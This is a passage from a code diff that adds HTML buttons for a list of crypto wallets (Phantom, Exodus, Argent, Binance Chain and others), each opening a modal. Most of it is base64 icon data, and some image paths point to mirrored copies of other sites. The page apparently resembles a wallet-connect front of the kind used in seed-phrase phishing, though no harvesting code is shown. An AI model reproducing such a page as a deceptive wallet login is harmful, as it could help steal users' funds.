hASgCAIAgCAgjIwgAGAgIc0O7zQR4hDxrUkDAwEPSUAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEB/9k=" alt="" />
+                            <h4>Terra station</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal103" class="btn coin">
+                            <img class="coin-img" src="data:image/jpeg;base64,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" alt="" />
+                            <h4>Phantom wallet</h4>
+                        </button>
+
+                        <button type="button"  data-bs-toggle="modal" data-bs-target="#exampleModal104" class="btn coin">
+                            <img class="coin-img" src="data:image/jpeg;base64,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" alt="" />
+                            <h4>Cosmos station</h4>
+                        </button>
+
+                        <button type="button"  data-bs-toggle="modal" data-bs-target="#exampleModal105" class="btn coin">
+                            <img class="coin-img" src="data:image/jpeg;base64,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" alt="" />
+                            <h4>Exodus wallet</h4>
+                        </button>
+
+
+                        <button type="button"  data-bs-toggle="modal" data-bs-target="#exampleModal" class="btn coin">
+                            <img class="coin-img" src="../assets.super.so/b7ac5b4c-2f39-474d-8a3c-4c0e68f5c2f6/uploads/logo/c36500d2-7e4b-40f5-a48b-3e6e364d7248.png" alt="" style="border-radius: 40px;" />
+                            <h4>Rainbow</h4>
+                        </button>
+
+                        <button type="button"  data-bs-toggle="modal" data-bs-target="#exampleModal3" class="btn coin">
+                            <img class="coin-img" src="../pbs.twimg.com/profile_images/1024585501901303808/m92jEcPI_400x400.jpg" alt="" />
+                            <h4>Argent</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal5" class="btn coin">
+                            <img class="coin-img" src="../user-images.githubusercontent.com/12424618/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png" alt="" style="border-radius: 50%;" />
+                            <h4>Binance Chain</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal6" class="btn coin">
